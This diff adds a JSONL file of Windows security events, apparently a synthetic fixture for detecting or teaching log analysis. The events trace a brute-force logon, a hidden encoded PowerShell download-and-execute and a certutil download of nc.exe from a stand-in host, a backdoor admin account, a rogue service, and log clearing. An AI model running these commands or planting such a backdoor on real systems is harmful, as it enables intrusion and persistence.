@@ -1,0 +1,15 @@
+{"TimeCreated": "2026-10-10T09:30:00Z", "EventID": 4688, "Computer": "WIN-SRV01", "SubjectUserName": "jdoe", "NewProcessName": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe C:\\Users\\jdoe\\notes.txt"}
+{"TimeCreated": "2026-10-10T09:40:01.1234560Z", "EventID": 4625, "Computer": "WIN-SRV01", "TargetUserName": "Administrator", "IpAddress": "203.0.113.80", "LogonType": "3", "Status": "0xC000006D"}
+{"TimeCreated": "2026-10-10T09:40:09.1234560Z", "EventID": 4625, "Computer": "WIN-SRV01", "TargetUserName": "Administrator", "IpAddress": "203.0.113.80", "LogonType": "3", "Status": "0xC000006D"}
+{"TimeCreated": "2026-10-10T09:40:17.1234560Z", "EventID": 4625, "Computer": "WIN-SRV01", "TargetUserName": "Administrator", "IpAddress": "203.0.113.80", "LogonType": "3", "Status": "0xC000006D"}
+{"TimeCreated": "2026-10-10T09:40:25.1234560Z", "EventID": 4625, "Computer": "WIN-SRV01", "TargetUserName": "Administrator", "IpAddress": "203.0.113.80", "LogonType": "3", "Status": "0xC000006D"}
+{"TimeCreated": "2026-10-10T09:40:33.1234560Z", "EventID": 4625, "Computer": "WIN-SRV01", "TargetUserName": "Administrator", "IpAddress": "203.0.113.80", "LogonType": "3", "Status": "0xC000006D"}
+{"TimeCreated": "2026-10-10T09:40:41.1234560Z", "EventID": 4625, "Computer": "WIN-SRV01", "TargetUserName": "Administrator", "IpAddress": "203.0.113.80", "LogonType": "3", "Status": "0xC000006D"}
+{"TimeCreated": "2026-10-10T09:41:05Z", "EventID": 4624, "Computer": "WIN-SRV01", "TargetUserName": "Administrator", "IpAddress": "203.0.113.80", "LogonType": "10"}
+{"TimeCreated": "2026-10-10T09:41:30Z", "EventID": 4624, "Computer": "WIN-SRV01", "TargetUserName": "jdoe", "IpAddress": "192.168.1.25", "LogonType": "3"}
+{"TimeCreated": "2026-10-10T09:42:10Z", "EventID": 4688, "Computer": "WIN-SRV01", "SubjectUserName": "Administrator", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwBwAC4AcABzADEAJwApAA=="}
+{"TimeCreated": "2026-10-10T09:42:40Z", "EventID": 4688, "Computer": "WIN-SRV01", "SubjectUserName": "Administrator", "NewProcessName": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.80/nc.exe C:\\Users\\Public\\nc.exe"}
+{"TimeCreated": "2026-10-10T09:43:10Z", "EventID": 4720, "Computer": "WIN-SRV01", "SubjectUserName": "Administrator", "TargetUserName": "svc_backup"}
+{"TimeCreated": "2026-10-10T09:43:30Z", "EventID": 4732, "Computer": "WIN-SRV01", "SubjectUserName": "Administrator", "TargetUserName": "Administrators", "MemberName": "CN=svc_backup,CN=Users,DC=corp,DC=local", "GroupName": "Administrators"}
+{"TimeCreated": "2026-10-10T09:44:00Z", "EventID": 7045, "Computer": "WIN-SRV01", "ServiceName": "UpdateSvc", "ImagePath": "C:\\Users\\Public\\upd.exe"}
+{"TimeCreated": "2026-10-10T09:50:00Z", "EventID": 1102, "Computer": "WIN-SRV01", "SubjectUserName": "Administrator"}
